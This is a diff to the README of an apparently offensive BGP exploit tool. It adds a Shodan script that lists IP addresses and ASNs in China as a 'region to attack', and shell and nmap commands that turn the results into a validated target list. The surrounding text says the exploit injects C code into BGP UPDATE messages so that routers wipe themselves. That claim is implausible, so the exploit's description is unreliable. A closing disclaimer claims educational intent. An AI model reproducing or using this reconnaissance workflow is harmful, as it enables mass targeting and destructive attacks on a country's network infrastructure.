@@ -49,6 +49,45 @@ To execute the exploit:
 4. The script will send BGP OPEN, UPDATE, and KEEPALIVE messages to the target router, injecting the malicious payload into the UPDATE messages.
 5. The target router will execute the C code injected into the UPDATE messages, wiping out the target system and rebooting.
 
+### Basic usage
+
+__**Shodan** script to find ASN of region to attack.__
+
+```py
+import shodan
+
+# Replace 'YOUR_API_KEY' with your actual Shodan API key
+api_key = 'YOUR_API_KEY'
+
+# Create a Shodan object
+shodan_api = shodan.Shodan(api_key)
+
+# Search for China's ASNs
+results = shodan_api.search('country:CN')
+
+# Print the results
+for result in results['matches']:
+    print(f"ASN: {result['asn']}, IP: {result['ip_str']}")
+```
+
+__Example to find targets for **BGP EXPLOIT**__
+
+```sh
+# Search Country/Region to attack.
+python shodan-script.py > list.txt;
+
+# Create a target list with one address per line
+cat list.txt | cut -d" " -f4 >new-list.txt
+
+# Remove IPV6 addresses (optional)
+sed -i '/^([0-9a-fA-F]{0,4}:){1,7}[0-9a-fA-F]{0,4}$/d' new-list.txt
+
+# Validate targets that are up.
+nmap -A -T4 -4 -p22,80,443 --script targets-asn --script-args targets-asn.asn=65000-65535 --webxml -oX region_X_is_vuln.xml -iL new-list.txt
+```
+
+### Now exploit the target with BGP Exploit.
+
 ## Disclaimer
 
 This exploit is for educational and ethical testing purposes only. The author is not responsible for any misuse or damage caused by the use of this script. Use responsibly and obtain proper authorization before performing any exploitation attempts.
